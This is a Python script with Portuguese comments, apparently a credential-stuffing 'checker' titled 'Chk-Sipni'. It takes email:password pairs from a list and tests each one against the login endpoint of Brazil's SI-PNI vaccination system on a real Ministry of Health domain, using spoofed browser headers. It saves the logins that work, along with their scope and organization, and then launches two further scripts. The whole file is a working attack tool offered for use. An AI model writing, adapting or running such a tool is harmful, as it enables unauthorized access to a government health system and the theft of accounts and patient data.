import requests
import base64
import json
import os
from colorama import Fore, init

init(autoreset=True)  # Inicializa o colorama

def getStr(string, start, end):
    start_index = string.find(start)
    if start_index == -1:
        return None
    start_index += len(start)
    end_index = string.find(end, start_index)
    if end_index == -1:
        return None
    return string[start_index:end_index]

print(Fore.YELLOW + f"""
_________  /\     __              ___________               __ 
\_   ___ \|  |__ |  | __         /   _____/__|_____   ____ |__|
/    \  \/|  |  \|  |/ /  ______ \_____  \|  |____ \ /    \|  |
\     \____      \    \  /_____/ /        \  |  |_\ \   |  \  |
 \______  /___|  /__|_ \        /_______  /__|   ___/___|  /__|
        \/     \/     \/                \/   |__|        \/
            
INFO =>    {Fore.RED}Conexão com o SI-PINI Realizada  |
""")




# Ler as credenciais do arquivo de texto
with open('lista.txt', 'r') as file:
    lines = file.readlines()

# Abre um arquivo para salvar os logins aprovados
with open('logins_aprovados.txt', 'a') as log_file:
    for line in lines:
        email, senha = line.strip().split(':')  # Supõe que o formato seja "email:senha"
        credentials = f"{email}:{senha}"
        credentials_base64 = base64.b64encode(credentials.encode()).decode()

        url = 'https://servicos-cloud.saude.gov.br/pni-bff/v1/autenticacao/tokenAcesso'

        headers = {
            "Host": "servicos-cloud.saude.gov.br",
            "Connection": "keep-alive",
            "Content-Length": "0",
            "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
            "accept": "application/json",
            "X-Authorization": f"Basic {credentials_base64}",
            "sec-ch-ua-mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "sec-ch-ua-platform": "Windows",
            "Origin": "https://si-pni.saude.gov.br",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://si-pni.saude.gov.br/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        }

        response = requests.post(url, headers=headers)

        fim = response.text

        if '"accessToken"' in fim:
            print(Fore.GREEN + f"#APROVADA => | {email} | {senha}")
            data = json.loads(fim)
            scope = data.get('scope', '')
            organization = data.get('organization', '')
            print(Fore.CYAN + f"Scope: {scope}")
            print(Fore.CYAN + f"Organização: {organization}")
            print("")
            # Salva as informações no arquivo
            log_file.write(f"Aprovado | {email} | {senha}\n")
            log_file.write(f"Scope: {scope}\n")
            log_file.write(f"Organização: {organization}\n\n")
        elif 'Usuário e senha SCPA não autorizados' in fim:
            print(Fore.RED + f"#REPROVADA =>  | {email} | {senha} Usuário e senha SCPA não autorizados")
            print("")

print("Logins aprovados foram salvos em 'logins_aprovados.txt'")
os.system('python gerado.py')
os.system('python sipini.py')
